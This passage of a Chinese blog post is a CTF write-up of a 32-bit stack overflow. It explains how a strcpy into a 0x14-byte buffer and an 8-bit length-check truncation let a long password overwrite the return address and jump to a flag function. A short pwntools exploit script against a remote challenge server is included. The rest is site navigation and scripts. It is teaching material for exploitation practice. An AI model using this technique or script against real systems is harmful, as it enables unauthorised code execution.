+<p>strcpy()函数存在溢出，dest的长度为0x14，那么strlen()检查长度存在v3,v3的长度为8bit,控制长度为3-8，由密码长度为0x199,经过无符号截取之后，整数型溢出，那么可以判断3-8的密码长度符合要求，<code>256+3-256+8</code>也符合要求。输入的密码覆盖掉dest之后可以溢出覆盖到其他值。</p>
+<p>也就是说输入0x14个字符之后，就可以覆盖到地址返回值了。</p>
+<p>寻找返回地址值：</p>
+<p><img src="/2021/05/24/%E4%BD%9C%E4%B8%9A/image-20210521152436590.png" alt="image-20210521152436590"></p>
+<p><img src="/2021/05/24/%E4%BD%9C%E4%B8%9A/image-20210521152454154.png" alt="image-20210521152454154"></p>
+<p>what_is_this()函数可以得到flag</p>
+<p><img src="/2021/05/24/%E4%BD%9C%E4%B8%9A/image-20210521152509101.png" alt="image-20210521152509101"></p>
+<p>这个函数的地址为：0x0804868b</p>
+<p>接下来看函数的具体执行过程，正确输入：</p>
+<p>首先将ebp入栈，最后转到了下一个函数</p>
+<p><img src="/2021/05/24/%E4%BD%9C%E4%B8%9A/image-20210521152521652.png" alt="image-20210521152521652"></p>
+<p><img src="/2021/05/24/%E4%BD%9C%E4%B8%9A/image-20210521152532621.png" alt="image-20210521152532621"></p>
+<p>这个函数执行了一次leave操作，mov esp,ebp pop ebp也就是说，在覆盖ebp的地址前还有一次出栈操作，栈溢出中还得将最后出栈的数据覆盖，才能转到返回地址，跳转到what_is_this函数</p>
+<p>选择256+6这个数：262-0x14(dest)-4(最后出栈)-4(返回地址)=234</p>
+<p>脚本如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">a &#x3D; remote(&#39;220.249.52.134&#39;,&#39;32586&#39;)</span><br><span class="line">payload&#x3D;&#39;a&#39;*0x14 + &#39;aaaa&#39; + p32(0x0804868b)+&#39;a&#39;*234</span><br><span class="line">a.recvuntil(&#39;choice:&#39;)</span><br><span class="line"></span><br><span class="line">a.sendline(&#39;1&#39;)</span><br><span class="line"></span><br><span class="line">a.recvuntil(&#39;username:&#39;)</span><br><span class="line"></span><br><span class="line">a.sendline(&#39;qt&#39;)</span><br><span class="line">a.recvuntil(&#39;passwd:&#39;)</span><br><span class="line"></span><br><span class="line">a.sendline(payload)</span><br><span class="line"></span><br><span class="line">a.recv()</span><br><span class="line"></span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/24/%E4%BD%9C%E4%B8%9A/image-20210521152547989.png" alt="image-20210521152547989"></p>
+
+      
+      <!-- reward -->
+      
+      <div id="reward-btn">
+        打赏
+      </div>
+      
+    </div>
+    
+    
+      <!-- copyright -->
+      
+        <div class="declare">
+          <ul class="post-copyright">
+            <li>
+              <i class="ri-copyright-line"></i>
+              <strong>版权声明： </strong s>
+              本博客所有文章除特别声明外，均采用 <a href="https://www.apache.org/licenses/LICENSE-2.0.html" rel="external nofollow"
+                target="_blank">Apache License 2.0</a> 许可协议。转载请注明出处！
+            </li>
+          </ul>
+        </div>
+        
+    <footer class="article-footer">
+      
+          
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://drag0nf1y.github.io/2021/05/24/%E4%BD%9C%E4%B8%9A/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/qemu/" rel="tag">qemu</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E/" rel="tag">漏洞</a></li></ul>
+
+
+    </footer>
+
+  </div>
+
+  
+  
+  <nav class="article-nav">
+    
+      <a href="/2021/06/15/ucore_lab1_%E5%AE%9E%E9%AA%8C/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            ucore_lab1_实验
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2021/05/07/rop/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">ROP攻击-----ctfwiki</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+  
+  
+<!-- valine评论 -->
+<div id="vcomments-box">
+    <div id="vcomments">
+    </div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src='https://cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        app_id: '',
+        app_key: '',
+        path: window.location.pathname,
+        notify: 'false',
+        verify: 'false',
+        avatar: 'mp',
+        placeholder: '给我的文章加点评论吧~',
+        recordIP: true
+    });
+    const infoEle = document.querySelector('#vcomments .info');
+    if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+        infoEle.childNodes.forEach(function (item) {
+            item.parentNode.removeChild(item);
+        });
+    }
+</script>
+<style>
+    #vcomments-box {
+        padding: 5px 30px;
+    }
+
+    @media screen and (max-width: 800px) {
+        #vcomments-box {
+            padding: 5px 0px;
+        }
+    }
+
+    #vcomments-box #vcomments {
+        background-color: #fff;
+    }
+
+    .v .vlist .vcard .vh {
+        padding-right: 20px;
+    }
+
+    .v .vlist .vcard {
+        padding-left: 10px;
+    }
+</style>
+
+  
+
+  
+  
+  
+
+</article>
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul class="list-inline">
+      <li>
+        &copy;
+        2019-2021
+        Drag0nf1y
+      </li>
+      <li>
+        
+      </li>
+    </ul>
+    <ul class="list-inline">
+      <li>
+        
+        
+        <span>
+  <i>PV:<span id="busuanzi_value_page_pv"></span></i>
+  <i>UV:<span id="busuanzi_value_site_uv"></span></i>
+</span>
+        
+      </li>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+    <div class="to_top">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+      </div>
+    </main>
+      <aside class="sidebar">
+        <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/ayer-side.svg" alt="Drag0nf1y"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives/">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories/">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags/">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories/%E5%85%B6%E4%BB%96/">其他</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories/%E7%A0%94%E7%A9%B6/">研究</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about/">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="Search">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+      </aside>
+      <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+      
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+<script src="/js/share.js"></script>
+
+
+
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+
+
+
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+  tocbot.init({
+    tocSelector: '.tocbot',
+    contentSelector: '.article-entry',
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer:'main',
+    positionFixedSelector: '.tocbot',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto',
+    onClick: (e) => {
+      $('.toc-link').removeClass('is-active-link');
+      $(`a[href=${e.target.hash}]`).addClass('is-active-link');
+      $(e.target.hash).scrollIntoView();
+      return false;
+    }
+  });
+</script>
+
+
+<script>
+  var ayerConfig = {
+    mathjax: false
+  }
+</script>
+
+
+<script src="/js/ayer.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script>
+
+
+
+
+<script type="text/javascript" src="https://js.users.51.la/20544303.js"></script>
+  </div>
+</body>
+
+</html>
